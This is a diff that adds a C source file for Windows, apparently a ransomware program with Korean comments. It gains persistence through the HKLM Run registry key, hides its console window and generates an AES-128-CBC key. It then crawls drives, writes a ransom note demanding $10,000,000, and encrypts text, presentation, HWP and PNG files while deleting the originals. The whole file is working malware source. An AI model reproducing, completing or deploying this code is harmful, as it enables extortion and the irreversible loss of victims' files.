@@ -1,0 +1,288 @@
+#define _CRT_SECURE_NO_WARNINGS
+#pragma warning(disable:4996)
+
+#include <stdio.h> 
+#include <string.h> 
+#include <windows.h> 
+#include <io.h>// 파일찾기 
+
+#include<openssl/evp.h>
+#include<openssl/rand.h>
+
+#define NUM_BYTES_READ 32
+#define PATH_SIZE 1000 
+#define TRUE 1
+#define FALSE 0
+typedef struct _finddata_t FILE_DATA;
+
+void CheckDevice(void);
+void FileList(char *path, char* ext, int search);
+int do_crypt(const unsigned char *key, const unsigned char *iv, FILE *ifp, FILE *ofp, int isEncrypt);
+BOOL SetStartProgram(LPCSTR lpPosition); // 시작 프로그램으로 등록
+
+unsigned char *key, *iv;
+
+int main(int argc, char** argv) {
+
+	SetStartProgram(argv[0]);
+
+	//콘솔창 안보이게 
+	HWND hWndConsole = GetConsoleWindow(); //윈도우 핸들 콘솔창 호출
+	ShowWindow(hWndConsole, SW_HIDE); //선택한 윈도우 창을 숨긴다
+
+	//EVP API를 써서 aes_cbc를 하기위해 초가화 과정
+	EVP_CIPHER_CTX *ctx_enc = EVP_CIPHER_CTX_new();
+
+	if (ctx_enc == NULL) {
+		printf("EVP_CIPHER_CTX_new is NULL error!!\n");
+		return -1;
+	}
+	if (!(EVP_CipherInit_ex(ctx_enc, EVP_aes_128_cbc(), NULL, NULL, NULL, 1))) {
+		printf("EVP_CipherInit_ex error!!\n");
+		return -1;
+	}
+
+	FILE *keyfp;
+	key = (unsigned char*)malloc(EVP_CIPHER_CTX_key_length(ctx_enc));    //key
+	iv = (unsigned char*)malloc(EVP_CIPHER_CTX_iv_length(ctx_enc));      //iv
+
+	if (fopen("E:\\usun.bin", "r") == NULL)
+	{
+		if (!RAND_bytes(key, EVP_CIPHER_CTX_key_length(ctx_enc))) {
+			printf("RAND_bytes function error!!\n");
+			return -1;
+		}
+
+		if (!RAND_bytes(iv, EVP_CIPHER_CTX_iv_length(ctx_enc))) {
+			printf("RAND_bytes function error!!\n");
+			return -1;
+		}
+
+		keyfp = fopen("E:\\usun.bin", "w");
+		fwrite(key, 1, EVP_CIPHER_CTX_key_length(ctx_enc), keyfp);
+		fwrite(iv, 1, EVP_CIPHER_CTX_iv_length(ctx_enc), keyfp);
+		fclose(keyfp);
+	}
+	else {
+		keyfp = fopen("E:\\usun.bin", "r");
+		fread(key, 1, EVP_CIPHER_CTX_key_length(ctx_enc), keyfp);
+		fread(iv, 1, EVP_CIPHER_CTX_iv_length(ctx_enc), keyfp);
+
+	}
+
+
+	printf("\n\nkey : ");
+	for (int i = 0; i < EVP_CIPHER_CTX_key_length(ctx_enc); i++) {
+		//key값 출력
+		printf("0x%X ", key[i]);
+	}
+	printf("\n\n");
+	printf("\n\ntiv : ");
+	for (int i = 0; i < EVP_CIPHER_CTX_key_length(ctx_enc); i++) {
+		//key값 출력
+		printf("0x%X ", iv[i]);
+	}
+
+
+
+	// 현재 프로그램 주소로 시작 프로그램 등록 
+	//SetStartProgram(argv[0]); 
+
+	
+	CheckDevice();
+
+	ShellExecute(NULL, "open", argv[0], NULL, NULL, SW_HIDE);      
+
+	free(key);
+	free(iv);
+	fclose(keyfp);
+}
+
+/*
+shellExecute에 사용되는 객체들의 뜻
+HINSTANCE ShellExecuteA(
+	HWND   hwnd,부모 창의 핸들
+	LPCSTR lpOperation, 지정된 파일을 엽ㄴ다
+	LPCSTR lpFile, 개체의 구문분석 이름을 전달
+	LPCSTR lpParameters, 프로그램에 전달되는 매개 변수를 지정로 끝나는 문자열
+	LPCSTR lpDirectory,값이 NULL 이면 현재 작업 디렉토리가 사용
+	INT    nShowCmd, 창을 숨기고 다른 창을 활성화합니다
+);
+*/
+
+void CheckDevice(void) {
+	int i;
+	char ch = 'Z', pos[50];
+	FILE* fp = NULL;
+
+	char *test = "You don't delete Me \n You must send to me $10,000,000\n After call me AAAA@a.a\n good luck";
+	while (ch != 'D') {
+		printf("%c 드라이브 탐색중...\n", ch);
+		sprintf(pos, "%c:\\READ_ME_Warning.txt", ch);
+
+		if ((fp = fopen(pos, "w")) != NULL) {
+			sprintf(pos, "%c:", ch);
+
+			fwrite(test, 1, strlen(test), fp);
+			printf("%c 디스크 탐색 시작\n", ch);
+
+			for (i = 0; i < 2; i++) {
+				FileList(pos, "txt", i);
+				FileList(pos, "ppt", i);
+				FileList(pos, "hwp", i);
+				FileList(pos, "png", i);
+				//	FileList(pos, "html", i);
+			}
+
+
+
+		}
+		ch--;
+	}
+}
+
+
+//재귀함수 형태로 path 안에 있는 모든 하위 경로 탐색
+void FileList(char *path, char* ext, int search) {
+
+	char newPath[PATH_SIZE];
+	char usunPath[PATH_SIZE];
+	long handle;
+	int result = 1;
+
+	FILE_DATA fd;
+
+
+	//search 0 - 폴더 탐색, search 1 - ext 파일 탐색
+	if (search == 0) {
+		sprintf(newPath, "%s\\*.", path);
+	}
+	else {
+		sprintf(newPath, "%s\\*.%s", path, ext);
+	}
+
+	//Path 폴더를 열고 폴더파일이 있는지 체크
+	if ((handle = _findfirst(newPath, &fd)) == -1L) {
+		return;
+	}
+
+	//하위 경로를 모두 탐색
+	while (result != -1) {
+
+		//하위 폴더 탐색
+		if ((search == 0) && strcmp(fd.name, ".") && strcmp(fd.name, "..")) {
+			sprintf(newPath, "%s\\%s", path, fd.name);
+
+			//하위 폴더에 있는 폴더 탐색
+			FileList(newPath, ext, 0);
+			//하위 폴더에 있는 ext파일 탐색
+			FileList(newPath, ext, 1);
+
+
+		}
+		else {
+			FILE *ifp, *ofp;
+			//파일 출력!! 암호화 시키기	
+			sprintf(newPath, "%s\\%s", path, fd.name);
+			
+			if (!strcmp(fd.name, ".") || !strcmp(fd.name, ".."))
+				break;
+			if (strpbrk(newPath, ext) == NULL)
+				break;
+
+			sprintf(usunPath, "%s.usun", newPath);
+			printf("newPath: %s\n", newPath);
+
+			ifp = fopen(newPath, "r");
+			ofp = fopen(usunPath, "w");
+			do_crypt(key, iv, ifp, ofp, 1);
+
+			fclose(ifp);
+			remove(newPath);
+			fclose(ofp);
+		}
+
+		//다음 경로로 이동
+		result = _findnext(handle, &fd);
+	}
+	_findclose(handle);
+	return;
+
+}
+
+int do_crypt(const unsigned char *key, const unsigned char *iv, FILE *ifp, FILE *ofp, int isEncrypt) {
+
+	rewind(ifp);
+	rewind(ofp);
+	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+
+	if (ctx == NULL) {
+		printf("EVP_CIPHER_CTX_new is NULL error!!\n");
+		return -1;
+	}
+
+	if (!(EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv, isEncrypt))) {
+		printf("EVP_CipherInit_ex error!!\n");
+		return -1;
+	}
+
+	unsigned char *input_buf = (unsigned char*)malloc(NUM_BYTES_READ);
+	unsigned char *output_buf = (unsigned char*)malloc(NUM_BYTES_READ + EVP_CIPHER_CTX_block_size(ctx));
+	if (input_buf == NULL) {
+		printf("cipher_buf_dec allocaion error!! \n");
+		return -1;
+	}
+	if (output_buf == NULL) {
+		printf("plain_buf_dec allocaion error!! \n");
+		return -1;
+	}
+
+	int inlen = 0, outtxtlen = 0;
+
+	while (1) {
+
+		inlen = fread(input_buf, 1, NUM_BYTES_READ, ifp);
+
+		if (inlen <= 0)
+			break;
+		if (1 != EVP_CipherUpdate(ctx, output_buf, &outtxtlen, input_buf, inlen)) {
+			printf("EVP_CipherUpdate error!!! \n");
+			return -1;
+		}
+
+		fwrite(output_buf, 1, outtxtlen, ofp);
+	}
+
+	EVP_CipherFinal(ctx, output_buf, &outtxtlen);
+	fwrite(output_buf, 1, outtxtlen, ofp);
+
+	EVP_CIPHER_CTX_free(ctx);
+	free(input_buf);
+	free(output_buf);
+
+
+
+	return 0;
+}
+
+
+
+BOOL SetStartProgram(LPCSTR lpPosition) {
+	HKEY hKey; // 핸들 키
+	long error; // 에러 확인
+	error = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0L, KEY_WRITE, &hKey); // 레지스터에 있는 키 열기
+	if (error == ERROR_SUCCESS) { // 성공 했는지 확인
+		error = RegSetValueEx(hKey, TEXT("HELLO"), 0, REG_SZ, (BYTE*)lpPosition, lstrlen(lpPosition)); RegCloseKey(hKey); // 리턴받은 핸들키에 Hello라는 레지스트리를 REG_SZ형식으로 만들고 lpPosition 프로그램으로 값을 등록한다.
+		return TRUE;
+
+	}
+	else if (error == ERROR_ACCESS_DENIED) { // 실패 할 경우(권한이 낮을 경우)
+		printf("ERROR_ACCESS_DENIED\n");
+
+	}
+	else {
+		printf("ERRORCODE : %ld\n", error); // 다른 오류 }
+		return FALSE;
+
+	}
+}
